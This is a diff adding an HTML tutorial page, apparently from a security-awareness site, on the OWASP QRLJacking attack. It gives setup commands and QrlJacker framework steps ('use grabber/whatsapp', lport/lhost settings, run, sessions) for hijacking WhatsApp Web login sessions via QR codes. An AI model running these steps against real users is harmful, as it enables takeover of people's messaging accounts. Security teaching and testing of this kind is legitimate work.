@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="logo.png"   type="image/x-icon" />
+    <link rel="stylesheet" href="pages.css">
+    <title>QrlJacker</title>
+   
+    </head>
+    <body>
+      <div class="container">
+        <nav>
+          <a href="home.html" style="font-size: 30px;">
+              <h2 class="abc">CODE SAFEGUARD</h2>
+          </a>
+          <a href="qrljacking.html">
+              <ul>
+                  <li> QrlJacker</li>
+              </ul>
+          </a>
+      </nav><br>
+        
+
+<br><br>
+<img src="https://owasp.org/www-community/assets/images/attacks/qrljacking-mitigation-scenario.jpg"  width="800" height="400" alt="https://owasp.org/www-community/assets/images/attacks/qrljacking-attack-flow.jpg">
+<br><br>
+
+
+<br><div class="custom-box1">
+    <p class="ab"> <br> Requirements :<br></p>
+  <p class="bcd">   <br>Kali Linux <br>
+   <br>python3.7+ <br></p>
+   </div><br>
+
+
+
+
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/scG6HoSSzsk" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><br>
+ 
+
+<br>
+<div class="custom-box">
+   
+   
+       
+            <b class="bc">  <br><br>COMMANDS <br></b><br><br>
+            <div class="button-container">
+                <button class="copy-button" onclick="copyCommandsToClipboard()">Copy Commands</button>
+            </div><br>
+
+
+ <b>
+
+   <i> <br>Install the latest geckodriver from https://github.com/mozilla/geckodriver/releases and extract the file then do <br></i>
+   <pre class="command"> <br>chmod +x geckodriver <br>
+<br>sudo mv -f geckodriver /usr/local/share/geckodriver <br>
+<br>sudo ln -s /usr/local/share/geckodriver /usr/local/bin/geckodriver <br>
+<br>sudo ln -s /usr/local/share/geckodriver /usr/bin/geckodriver <br>
+<br>git clone https://github.com/OWASP/QRLJacking then do cd QRLJacking/QRLJacker <br>
+<br> pip install -r requirements.txt <br>
+<br>python3 QrlJacker.py <br></pre>
+<i><br>after opening the framework <br></i>
+<pre class="command">
+<br>use grabber/whatsapp <br>
+<br>set lport 4444 <br>
+<br>set lhost 0.0.0.0 <br>
+<br>run <br>
+<br>sessions <br></pre>
+
+<br>
+
+</div>
+</div>
+</div>
+<script src="pages.js"></script>
+</body>
+</html>
